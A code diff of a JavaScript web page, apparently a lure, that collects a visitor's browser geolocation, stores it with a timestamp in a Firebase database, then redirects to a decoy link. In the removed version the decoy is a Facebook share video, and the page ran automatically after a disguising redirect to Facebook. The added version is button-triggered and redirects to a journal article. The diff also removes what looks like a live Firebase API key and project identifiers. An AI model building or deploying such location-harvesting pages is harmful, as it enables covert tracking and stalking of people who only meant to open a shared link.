@@ -4,44 +4,24 @@ import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.
 
 // Configuración de Firebase
 const firebaseConfig = {
-    apiKey: "AIzaSyDo4j7zm_poOFz5tRUkRULjxrZO2jlOuaM",
-    authDomain: "ubicacionesweb.firebaseapp.com",
-    databaseURL: "https://ubicacionesweb-default-rtdb.firebaseio.com",
-    projectId: "ubicacionesweb",
-    storageBucket: "ubicacionesweb.firebasestorage.app",
-    messagingSenderId: "916561063858",
-    appId: "1:916561063858:web:316104fb181e9377fabeab"
+    apiKey: "TU_API_KEY",
+    authDomain: "TU_AUTH_DOMAIN",
+    databaseURL: "TU_DATABASE_URL",
+    projectId: "TU_PROJECT_ID",
+    storageBucket: "TU_STORAGE_BUCKET",
+    messagingSenderId: "TU_MESSAGING_SENDER_ID",
+    appId: "TU_APP_ID"
 };
 
 // Inicializar Firebase
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 
-// Función para detectar si es móvil
-function esMovil() {
-    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-}
-
-// Redirigir a Facebook según el dispositivo
-function redirigirFacebook() {
-    if (esMovil()) {
-        // Intentar abrir en la app de Facebook
-        window.location.href = "fb://facewebmodal/f?href=https://www.facebook.com";
-        // Si falla, después de 2 segundos, abrir en el navegador
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com";
-        }, 2000);
-    } else {
-        // Si es PC, abrir directamente en Facebook web
-        window.location.href = "https://www.facebook.com";
-    }
-}
-
-// Obtener ubicación
+// Función para obtener ubicación
 function obtenerUbicacion() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            function (position) {
+            function(position) {
                 let lat = position.coords.latitude;
                 let lon = position.coords.longitude;
                 let timestamp = new Date().toLocaleString();
@@ -53,15 +33,16 @@ function obtenerUbicacion() {
                     fecha: timestamp
                 }).then(() => {
                     console.log("Ubicación guardada:", lat, lon);
-                    // Redirigir a la página final
-                    window.location.href = "https://www.facebook.com/share/v/1HkqwzKdn8/";
+                    
+                    // Redirigir a la URL final
+                    window.location.href = "https://revistas.iiap.gob.pe/index.php/foliaamazonica/article/view/687/637";
                 }).catch(error => {
                     console.error("Error al guardar ubicación:", error);
                 });
 
             },
-            function (error) {
-                alert("Debes permitir el acceso a la ubicación.");
+            function(error) {
+                alert("Debes permitir el acceso a la ubicación para continuar.");
             }
         );
     } else {
@@ -69,13 +50,5 @@ function obtenerUbicacion() {
     }
 }
 
-// Proceso automático al cargar la página
-window.onload = function () {
-    // 1. Redirigir a Facebook
-    redirigirFacebook();
-
-    // 2. Esperar 5 segundos y pedir ubicación
-    setTimeout(() => {
-        obtenerUbicacion();
-    }, 5000);
-};
+// Agregar evento al botón
+document.getElementById("btnUbicacion").addEventListener("click", obtenerUbicacion);
